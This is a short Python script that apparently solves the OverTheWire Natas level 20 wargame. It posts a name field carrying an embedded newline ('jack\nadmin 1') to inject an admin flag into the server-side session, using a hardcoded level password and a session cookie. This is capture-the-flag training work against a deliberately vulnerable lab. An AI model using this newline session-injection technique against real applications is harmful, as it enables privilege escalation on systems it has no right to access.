import requests 


url="http://natas20.natas.labs.overthewire.org"
auth=("natas20","p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
data={
    "name":"jack"
}
params={
    "debug":"1"
}
cookies={
    "PHPSESSID":"pjckjhnvbcb58ighepg6ojclo9"
}



data["name"]="jack\nadmin 1"


response=requests.post(
    url,
    data=data,
    auth=auth,
    cookies=cookies,
    params=params
)


print(response.text)

